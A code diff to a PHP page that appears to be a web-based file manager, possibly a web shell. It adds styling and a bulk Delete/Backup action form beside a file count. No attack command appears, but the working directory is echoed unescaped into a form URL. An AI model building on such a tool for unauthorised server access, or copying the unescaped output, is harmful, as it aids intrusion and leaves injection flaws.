@@ -412,9 +412,20 @@ function alert($message) {
         font-family: 'Open Sans', sans-serif;
     }
     .count {
-        box-shadow: 0px 0px 0px 2px #e0e0e0;
+    	z-index: 99999;
+    	margin-top:-20px;
+    	padding-top: 10px;
+    	text-align: center;
         padding:10px;
-        padding-left:20px;
+        padding-left:15px;
+    }
+    .count span {
+    	font-family: 'Open Sans', sans-serif;
+    	
+    }
+    .count select {
+    	width:50%;
+    	padding:7px;
     }
     .back .mobile {
         padding-left:25px;
@@ -1450,8 +1461,18 @@ function filterTable() {
         ?>
     </table>
     </div>
-    <div class="count">
-        Total Files : <?= XN::countAllFiles(getcwd()) ?>
-    </div>
+    <form method="post" action="?x=<?= getcwd() ?>">
+    	<div class="count">
+    		<input type="checkbox"> Select All
+    		<select name="" onchange='if(this.value != 0) { this.form.submit(); }'>
+    			<option disabled selected>Action</option>
+    			<option>Delete</option>
+    			<option>Backup</option>
+    		</select>
+        	<span>
+        		Total Files : <?= XN::countAllFiles(getcwd()) ?>
+        	</span>
+    	</div>
+	</form>
 </div>
 </center>
